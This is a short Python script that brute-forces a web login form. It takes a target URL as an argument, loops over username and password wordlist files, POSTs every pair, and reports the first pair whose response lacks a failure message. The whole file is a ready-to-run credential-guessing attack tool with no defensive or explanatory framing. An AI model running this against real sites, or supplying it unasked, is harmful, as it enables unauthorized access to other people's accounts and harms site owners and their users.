#!/usr/bin/env python
import requests
import optparse
import argparse

def get_args():
    try:
        parser = optparse.OptionParser()
        parser.add_option("-t", "--target", dest="target_website", help="Target website example.com")
        value, options = parser.parse_args()
    except:
        parser = argparse.ArgumentParser()
        parser.add_argument("-t", "--target", dest="target_website", help="Target website example.com")
        value = parser.parse_args()
    if not value.target_website:
        parser.error("[-] ERROR Missing argument, use --help or more info")
    else:
        return value

value = get_args()
traget_page = value.target_website
try_data= {"username":"", "password":"", "login":"submit"}

with open("uname.txt", "r") as unamefile:
    for line in unamefile:
        name = line.strip()
        try_data["username"] = name
        with open("passwd.txt", "r") as passfile:
            for txt in passfile:
                passd = txt.strip()
                try_data["password"] = passd
                resp = requests.post(traget_page, data=try_data)
                if "Login failed" not in resp.content and "Incorrect" not in resp.content:
                    print("[+] Credential found --> USERNAME:" + name + "\tPASSWORD:" + passd)
                    exit()

print("[-] Unable to find Credentials, Upgrade your wordlist.")
